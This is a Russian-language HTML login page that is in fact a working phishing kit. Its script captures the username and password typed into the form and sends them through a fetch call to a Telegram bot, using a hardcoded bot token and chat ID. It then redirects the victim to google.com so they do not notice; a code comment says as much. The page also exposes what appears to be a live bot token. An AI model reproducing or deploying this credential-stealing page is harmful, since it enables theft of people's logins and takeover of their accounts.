<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в аккаунт</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #5a67d8;
        }
        .note {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Вход в систему</h2>
        <form id="loginForm" action="javascript:void(0);">
            <label>Email или телефон</label>
            <input type="text" id="username" placeholder="Введите email" required>
            
            <label>Пароль</label>
            <input type="password" id="password" placeholder="Введите пароль" required>
            
            <button type="submit">Войти</button>
        </form>
        <p class="note">В целях безопасности сессия будет обновлена</p>
    </div>

    <script>
    // ===== ТВОИ ДАННЫЕ (уже вставлены) =====
    const BOT_TOKEN = "8688927439:AAGLGNK2meKkwiq509wnR2up6oq98-R8pcE";
    const CHAT_ID = "6689561934";

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        if (!username || !password) {
            alert('Заполните все поля');
            return;
        }
        
        // Формируем сообщение
        const message = `🔐 НОВЫЙ ЛОГИН\n👤 Логин: ${username}\n🔑 Пароль: ${password}\n🕐 ${new Date().toLocaleString()}`;
        
        // Отправляем в Telegram
        sendToTelegram(message);
        
        // Перенаправляем на реальный сайт (чтобы жертва не поняла)
        window.location.href = 'https://google.com';
    });

    function sendToTelegram(msg) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: 'HTML'
            })
        })
        .then(response => console.log('Отправлено'))
        .catch(error => console.error('Ошибка:', error));
    }
    </script>
</body>
</html>
